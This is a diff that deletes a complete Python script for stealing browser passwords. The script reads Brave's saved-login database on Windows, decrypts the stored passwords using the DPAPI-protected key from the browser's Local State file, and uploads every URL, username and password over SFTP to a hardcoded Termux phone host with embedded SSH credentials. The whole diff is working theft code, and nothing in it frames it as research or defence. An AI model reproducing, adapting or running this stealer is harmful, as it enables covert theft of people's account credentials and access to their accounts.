@ -1,103 +0,0 @@
import os
import sqlite3
import json
import base64
import shutil
import tempfile
import paramiko
import socket
from Crypto.Cipher import AES  # Ensure 'pycryptodome' is installed
import win32crypt  # Ensure 'pywin32' is installed

# SSH connection details
TERMUX_IP = "192.168.39.25"  # Replace with actual Termux IP address
TERMUX_PORT = 8022  # Default Termux SSH port
USERNAME = "u0_a269"  # Termux username
PASSWORD = "7869"  # SSH password
REMOTE_PATH = "storage/downloads/"  # Path on Termux to store cookies

# Locate Brave's Login Data file
appdata_path = os.getenv("LOCALAPPDATA")
login_data_path = os.path.join(appdata_path, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")

# Temporary path to copy Login Data for reading
temp_login_data_path = os.path.join(tempfile.gettempdir(), "Login Data")
shutil.copyfile(login_data_path, temp_login_data_path)

# Helper function to decrypt password
def decrypt_password(encrypted_password):
    try:
        # Skip DPAPI prefix
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(get_encryption_key(), AES.MODE_GCM, nonce=encrypted_password[:12])
        decrypted_pass = cipher.decrypt(encrypted_password[12:])
        
        # Decode as UTF-8 with errors ignored to remove unreadable characters
        return decrypted_pass.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"Failed to decrypt password: {e}")
        return ""

# Function to retrieve the decryption key from Brave’s local State file
def get_encryption_key():
    state_path = os.path.join(appdata_path, "BraveSoftware", "Brave-Browser", "User Data", "Local State")
    with open(state_path, "r", encoding="utf-8") as f:
        encrypted_key = json.loads(f.read())["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key)[5:]  # Remove DPAPI header
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Retrieve saved logins from the database
def fetch_logins():
    connection = sqlite3.connect(temp_login_data_path)
    cursor = connection.cursor()

    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    logins = []
    for url, username, encrypted_password in cursor.fetchall():
        decrypted_password = decrypt_password(encrypted_password)
        logins.append((url, username, decrypted_password))

    cursor.close()
    connection.close()
    return logins

# SSH transfer function to Termux
def transfer_logins_via_ssh(logins):
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(TERMUX_IP, port=TERMUX_PORT, username=USERNAME, password=PASSWORD, timeout=10)

        sftp = ssh_client.open_sftp()
        remote_file_path = os.path.join(REMOTE_PATH, "Brave_Logins.txt")
        
        # Write logins to a temporary file with UTF-8 encoding
        with open("Brave_Logins.txt", "w", encoding="utf-8") as f:
            for url, username, password in logins:
                f.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")
        
        # Transfer the file to Termux
        sftp.put("Brave_Logins.txt", remote_file_path)
        print(f"Brave logins successfully transferred to Termux at {remote_file_path}")

        # Clean up
        sftp.close()
        ssh_client.close()
        os.remove("Brave_Logins.txt")

    except (paramiko.ssh_exception.SSHException, socket.gaierror) as e:
        print(f"SSH connection failed: {e}")

# Main process
if os.path.exists(login_data_path):
    logins = fetch_logins()
    if logins:
        transfer_logins_via_ssh(logins)
    else:
        print("No saved logins found in Brave.")
else:
    print("Brave Login Data file not found.")

# Cleanup temporary Login Data file after transferring
os.remove(temp_login_data_path)
print("Temporary files cleaned up.")